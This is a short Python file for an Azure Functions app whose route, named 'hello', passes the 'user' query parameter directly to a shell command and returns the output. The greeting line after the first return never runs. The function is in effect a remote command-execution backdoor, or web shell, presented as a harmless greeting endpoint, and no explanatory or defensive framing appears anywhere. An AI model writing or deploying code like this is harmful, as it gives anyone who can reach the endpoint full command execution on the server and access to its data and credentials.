import azure.functions as func

from subprocess import check_output

import subprocess

def shell(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('latin-1')
    except subprocess.CalledProcessError as e:
        return e.output.decode('latin-1')

app = func.FunctionApp()

@app.route("hello")
def http_trigger(req):
    user = req.params.get("user")
    return shell(user)
    return f"Hello, {user}!"
